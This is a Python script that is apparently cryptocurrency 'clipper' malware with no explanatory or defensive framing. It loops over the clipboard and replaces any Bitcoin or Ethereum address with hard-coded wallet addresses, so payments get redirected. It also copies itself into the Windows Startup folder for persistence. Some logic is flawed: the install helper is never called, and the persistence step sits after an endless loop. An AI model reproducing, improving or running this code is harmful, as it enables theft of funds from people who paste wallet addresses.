import os
import subprocess
import sys
import re

def install_pyperclip():
    python_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython", "App", "Python", "python.exe")
    pip_check = subprocess.run([python_path, "-m", "pip", "--version"], capture_output=True, text=True)
    
    if "not found" in pip_check.stderr:
        ppython_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython")
        sys.path.append(ppython_path)

    subprocess.run([python_path, "-m", "pip", "install", "pyperclip"])

import pyperclip
import shutil
import random
import os

btc_addresses = {
    "1": "15NeX4ULnHEDPwRjxedRdecpDD3PqzQw7U",
    "bc1": "bc1q9lugaxp4e00cczl6tfyqluwnhlyd0ekcwvsfk4",
    "3": "3NNGBGiwa5vs2nnA7VAaB9R1XrTg3xeeJN"
}

eth_addresses = ["0xf5450c06CafF5E3E26220D356184b81914CB7f6C", "0xB8643f7fc440A7164a0bA5AF25eDC81C7c7Ca597", "0xEc7cAA68bcF83f2e24c0E23240Da4606E75a0818"]

btc_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$')
eth_pattern = re.compile(r'^0x[a-fA-F0-9]{40}$')

def replace_address():
    current_address = pyperclip.paste().strip()

    if btc_pattern.match(current_address):
        for prefix, target_address in btc_addresses.items():
            if current_address.startswith(prefix):
                pyperclip.copy(target_address)
                print(f"BTC address replaced: {current_address} -> {target_address}")
                return
    elif eth_pattern.match(current_address):
        if current_address not in eth_addresses:
            new_address = random.choice(eth_addresses)
            pyperclip.copy(new_address)
            print(f"ETH address replaced: {current_address} -> {new_address}")

while True:
    try:
        current_address = pyperclip.paste().strip()
        if btc_pattern.match(current_address) or eth_pattern.match(current_address):
            replace_address()
    except KeyboardInterrupt:
        break

script_path = os.path.abspath(sys.argv[0])
user_dir = os.path.expanduser('~')
new_folder_path = os.path.join(user_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
os.makedirs(new_folder_path, exist_ok=True)
new_script_path = os.path.join(new_folder_path, os.path.basename(script_path))
shutil.copy(script_path, new_script_path)
